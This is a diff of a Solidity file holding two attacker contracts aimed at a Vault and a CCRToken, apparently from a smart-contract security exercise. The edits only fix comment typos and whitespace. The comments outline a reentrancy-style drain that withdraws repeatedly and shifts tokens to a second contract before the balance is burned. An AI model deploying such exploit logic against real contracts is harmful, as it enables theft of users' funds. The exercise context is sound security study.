@@ -2,7 +2,6 @@
 pragma solidity 0.8.20;
 import "./vault.sol";
 
-
 contract Attacker1 {
     Vault victim;
     CCRToken ccrt;
@@ -18,7 +17,6 @@ contract Attacker1 {
         ccrt = CCRToken(_ccrt);  
     }
 
-
     /**
      * @notice Set attacker2 contract
      * @param _attacker2  attacker colleague address
@@ -28,7 +26,7 @@ contract Attacker1 {
     }
 
     /**
-     * @notice Receive ether. same amout of withdraw() but we can transfer same amount to attacker2. 
+     * @notice Receive ether. the same amount of withdraw() but we can transfer the same amount to attacker2. 
      * Because burn balance of attacker1 after this function.
      * @dev triggered by victim.withdraw()
      */
@@ -37,7 +35,7 @@ contract Attacker1 {
     }
 
     /**
-     * @notice deposit and we can repeatly withdraw.
+     * @notice deposit and we can repeatedly withdraw.
      */
     function attack() public {
         uint256 value = address(this).balance;
@@ -67,5 +65,3 @@ contract Attacker2 {
         ccrt.transfer(_target, _amount);
     }
 }
-
-
